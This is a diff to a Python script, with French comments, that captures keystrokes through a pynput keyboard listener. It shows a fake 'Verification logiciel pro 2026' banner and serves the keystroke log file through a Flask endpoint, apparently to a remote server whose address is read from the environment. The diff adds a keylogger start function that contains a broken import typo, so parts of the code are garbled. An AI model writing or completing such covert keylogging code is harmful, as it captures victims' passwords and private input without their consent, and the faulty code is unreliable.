@@ -1,6 +1,6 @@
 
 from httpcore import URL
-from pynput import keyboard
+
 import requests
 import os 
 from dotenv import load_dotenv
@@ -18,11 +18,11 @@ load_dotenv(ROOT_DIR / '.env')
 # MongoDB connection
 SERVER_URL = os.environ['SERVER_URL']
 
+
 USE_PYNPUT = os.environ.get("USE_PYNPUT") == "1"
 
 if USE_PYNPUT:
     from pynput import keyboard
-
 # Fichier local pour enregistrer mes codes
 print("Verification logiciel pro 2026 ✅", flush=True)
 
@@ -42,6 +42,17 @@ def on_press(key):
 # Démarre l'écoute des frappes
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
+def start_keyboard_listener():
+    from pynput import keyboar
+
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+if __name__ == "__main__":
+    if USE_PYNPUT:
+        start_keyboard_listener()
+
 
 app = Flask(__name__)
 LOG_FILE = "/var/data/log.txt"
@@ -70,3 +81,4 @@ def read_logs():
         return {"error": "log.txt introuvable", "path": LOG_FILE}, 404
     with open(LOG_FILE, "r", encoding="utf-8") as f:
         return "<pre>" + f.read() + "</pre>", 200
+
